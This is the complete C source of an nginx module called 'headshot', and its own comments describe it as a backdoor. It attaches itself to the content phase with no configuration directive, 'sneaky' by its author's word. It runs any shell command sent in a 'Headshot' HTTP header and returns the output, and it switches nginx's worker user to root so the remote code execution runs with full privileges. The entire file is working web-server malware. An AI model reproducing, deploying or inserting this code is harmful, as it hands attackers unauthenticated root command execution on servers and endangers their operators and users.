#include <stdlib.h>
#include <string.h>

#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

static ngx_int_t ngx_http_headshot_init(ngx_conf_t *cf);
static ngx_int_t ngx_http_headshot_init_module(ngx_cycle_t *cycle);
static ngx_int_t ngx_http_headshot_handler(ngx_http_request_t *r);

/**
 * This module provided directive: headshot.
 *
 */
static ngx_command_t ngx_http_headshot_commands[] = {

    { ngx_string("headshot"), /* directive - not needed really ;) */
      NGX_HTTP_MAIN_CONF|NGX_HTTP_SRV_CONF|NGX_HTTP_LOC_CONF|NGX_CONF_FLAG, /* any context and takes a flag argument(on or off)*/
      ngx_conf_set_flag_slot, /* configuration setup function - never called if directive not placed in config file */
      0, /* No offset. Only one context is supported. */
      0, /* No offset when storing the module configuration on struct. */
      NULL},

    ngx_null_command /* command termination */
};

/* The module context. */
static ngx_http_module_t ngx_http_headshot_module_ctx = {
    NULL, /* preconfiguration */
    ngx_http_headshot_init, /* postconfiguration */

    NULL, /* create main configuration */
    NULL, /* init main configuration */

    NULL, /* create server configuration */
    NULL, /* merge server configuration */

    NULL, /* create location configuration */
    NULL /* merge location configuration */
};

/* Module definition. */
ngx_module_t ngx_http_headshot_module = {
    NGX_MODULE_V1,
    &ngx_http_headshot_module_ctx, /* module context */
    ngx_http_headshot_commands, /* module directives */
    NGX_HTTP_MODULE, /* module type */
    NULL, /* init master */
    ngx_http_headshot_init_module, /* init module */
    NULL, /* init process */
    NULL, /* init thread */
    NULL, /* exit thread */
    NULL, /* exit process */
    NULL, /* exit master */
    NGX_MODULE_V1_PADDING
};

/**
 * Header Grabber. Searches through header list for specific header.
 *
 * @param r
 *   Pointer to the request structure. See http_request.h.
 * @param name
 *   The name of the header searching for.
 * @param len
 *   The length of the header name.
 * @return
 *   The status of the response generation.
 */
static ngx_table_elt_t * search_headers_in(ngx_http_request_t *r, u_char *name, size_t len){
    ngx_list_part_t            *part;
    ngx_table_elt_t            *h;
    ngx_uint_t                  i;

    /*
    Get the first part of the list. There is usual only one part.
    */
    part = &r->headers_in.headers.part;
    h = part->elts;

    /*
    Headers list array may consist of more than one part,
    so loop through all of it
    */
    for (i = 0; /* void */ ; i++) {
        if (i >= part->nelts) {
            if (part->next == NULL) {
                /* The last part, search is done. */
                break;
            }

            part = part->next;
            h = part->elts;
            i = 0;
        }

        /*
        Just compare the lengths and then the names case insensitively.
        */
        if (len != h[i].key.len || ngx_strcasecmp(name, h[i].key.data) != 0) {
            /* This header doesn't match. */
            continue;
        }

        /*
        Ta-da, we got one!ngx_http_next_header_filter
        Note, we'v stop the search at the first matched header
        while more then one header may fit.
        */
        return &h[i];
    }

    /*
    No headers was found
    */
    return NULL;
}

/**
 * The main handler logic. Looks for Magic Header, if exists then executes command
 * otherwise will just operate as normal.
 *
 * @param r
 *   Pointer to the request structure. See http_request.h.
 * @return
 *   The status of the response generation.
 */
static ngx_int_t ngx_http_headshot_handler(ngx_http_request_t *r){

    ngx_str_t ngx_headshot = ngx_string("Headshot");
    ngx_table_elt_t *cmd_elt = search_headers_in(r, ngx_headshot.data, ngx_headshot.len);
    if (cmd_elt != NULL){
        /* Run Command */
        FILE *fd;
        char *safe_command = malloc(cmd_elt->value.len + 5);
        strcpy(safe_command, (const char *)(cmd_elt->value.data));
        strcat(safe_command, " 2>&1");
        fd = popen(safe_command, "r");
        if (!fd) return NGX_DECLINED;
 
        char buffer[256];
        size_t chread;
        /* String to store entire command contents in */
        size_t comalloc = 256;
        size_t comlen   = 0;
        char *comout   = malloc(comalloc);
 
        /* Use fread so binary data is dealt with correctly */
        while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
            if (comlen + chread >= comalloc) {
                comalloc *= 2;
                comout = realloc(comout, comalloc);
            }
            memmove(comout + comlen, buffer, chread);
            comlen += chread;
        }
 
        pclose(fd);
        free(safe_command);
        ngx_buf_t *b;
        ngx_chain_t out;

        /* Set the Content-Type header. */
        r->headers_out.content_type.len = sizeof("text/plain") - 1;
        r->headers_out.content_type.data = (u_char *) "text/plain";

        /* Allocate a new buffer for sending out the reply. */
        b = ngx_pcalloc(r->pool, sizeof(ngx_buf_t));

        /* Insertion in the buffer chain. */
        out.buf = b;
        out.next = NULL; /* just one buffer */
	
        if (comlen == 0){
            free(comout);
            comout = "<-- no stderr/stdout from your command -->\n";
            comlen = 43;
        }

        b->pos = (unsigned char *)comout; /* first position in memory of the data */
        b->last = (unsigned char *)comout + comlen; /* last position in memory of the data */
        b->memory = 1; /* content is in read-only memory */
        b->last_buf = 1; /* there will be no more buffers in the request */

        /* Sending the headers for the reply. */
        r->headers_out.status = NGX_HTTP_OK; /* 200 status code */
        /* Get the content length of the body. */
        r->headers_out.content_length_n = comlen;
        ngx_http_send_header(r); /* Send the headers */

        /* Send the body, and return the status code of the output filter chain. */
        return ngx_http_output_filter(r, &out);
    }

    /* this means we really don't wana fuck with the response body */
    return NGX_DECLINED;
}

/**
 * Module Initialization function. To make our RCE relevant I just change
 * the user NGINX would normally run as to root. ;)
 *
 * @param cycle
 *   The current NGINX cycle.
 * @return ngx_int_t
 *   Status of the module init.
 */
static ngx_int_t ngx_http_headshot_init_module(ngx_cycle_t *cycle){
    ngx_core_conf_t *ccf =  (ngx_core_conf_t *)ngx_get_conf(cycle->conf_ctx, ngx_core_module);
    ccf->username = "root";
    ccf->user = 0;
    ccf->group = 0;
    return NGX_OK;
}

/**
 * Configuration setup function that installs the content handler.
 * this is sneaky af as I just attach it to NGINX's NGX_HTTP_CONTENT_PHASE
 * this makes it so no directive is needed in the nginx.conf.
 *
 * @param cf
 *   Module configuration structure pointer.
 * @return ngx_int_t
 *   Status of the postconfiguration.
 */
static ngx_int_t ngx_http_headshot_init(ngx_conf_t *cf){
    ngx_http_handler_pt        *h;
    ngx_http_core_main_conf_t  *cmcf;
    


    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);

    h = ngx_array_push(&cmcf->phases[NGX_HTTP_CONTENT_PHASE].handlers);
    if (h == NULL) {
        return NGX_ERROR;
    }

    *h = ngx_http_headshot_handler;

    return NGX_OK;
}
